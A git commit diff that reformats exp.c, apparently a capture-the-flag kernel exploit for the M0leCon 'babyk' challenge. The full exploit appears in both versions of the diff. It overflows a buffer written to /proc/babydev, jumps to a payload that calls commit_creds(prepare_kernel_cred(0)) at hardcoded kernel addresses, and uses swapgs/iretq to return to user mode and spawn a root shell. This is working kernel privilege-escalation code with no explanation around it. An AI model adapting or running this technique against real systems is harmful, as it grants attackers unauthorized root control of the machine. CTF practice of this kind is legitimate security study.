af14e2128c123863589e8dbb902966dad53eef8e
Th3F0x-code <alessio.ciccola@gmail.com>
2020-08-28 01:13:10 +0200

    New Writeup

--- M0leCon/babyk/exp.c
+++ M0leCon/babyk/exp.c
@@ -5,51 +5,53 @@
 #include <string.h>
 #include <stdint.h>
 
-struct trap_frame{
-        void *rip;
-        uint64_t cs;
-        uint64_t rflags;
-        void *rsp;
-        uint64_t ss;
+struct trap_frame {
+    void *rip;
+    uint64_t cs;
+    uint64_t rflags;
+    void *rsp;
+    uint64_t ss;
 };
 struct trap_frame tf;
 
 void launch_shell() {
-        getuid();
-        system("/bin/sh");
+    getuid();
+    system("/bin/sh");
 }
 
-void prepare_tf(){
-        asm(    "movq %%cs, %0\n"
-                "movq %%ss, %1\n"
-                "movq %%rsp, %3\n"
-                "pushfq\n"
-                "popq %2\n"
-                : "=r"(tf.cs), "=r"(tf.ss), "=r"(tf.rflags), "=r"(tf.rsp) :: "memory"
-        );
-        tf.rip = &launch_shell;
-        tf.rsp -= 1024;
+void prepare_tf() {
+    asm(    "movq %%cs, %0\n"
+            "movq %%ss, %1\n"
+            "movq %%rsp, %3\n"
+            "pushfq\n"
+            "popq %2\n"
+    : "=r"(tf.cs), "=r"(tf.ss), "=r"(tf.rflags), "=r"(tf.rsp)::"memory"
+    );
+    tf.rip = &launch_shell;
+    tf.rsp -= 1024;
 }
 
 #define KERNCALL __attribute__((regparm(3)))
-void (*commit_creds)(void *) KERNCALL = (void *)0xffffffff81052830;
-void *(*prepare_kernel_cred)(void *) KERNCALL = (void *)0xffffffff81052a60;
 
-void payload(void){
-        commit_creds(prepare_kernel_cred(0));
-        asm(    "swapgs\n"
-                "mov $tf,%rsp\n"
-                "iretq\n"
-        );
+void (*commit_creds)(void *) KERNCALL = (void *) 0xffffffff81052830;
+
+void *(*prepare_kernel_cred)(void *) KERNCALL = (void *) 0xffffffff81052a60;
+
+void payload(void) {
+    commit_creds(prepare_kernel_cred(0));
+    asm(    "swapgs\n"
+            "mov $tf,%rsp\n"
+            "iretq\n"
+    );
 }
 
-int main(){
-        char buf[300]={0};
-        memset(buf,'A',124);
-        *(void **)(buf+124) = &payload;
-        prepare_tf();
+int main() {
+    char buf[300] = {0};
+    memset(buf, 'A', 124);
+    *(void **) (buf + 124) = &payload;
+    prepare_tf();
 
-        int fd=open("/proc/babydev",O_WRONLY);
-        write(fd,buf,sizeof(buf));
-        return 0;
+    int fd = open("/proc/babydev", O_WRONLY);
+    write(fd, buf, sizeof(buf));
+    return 0;
 }
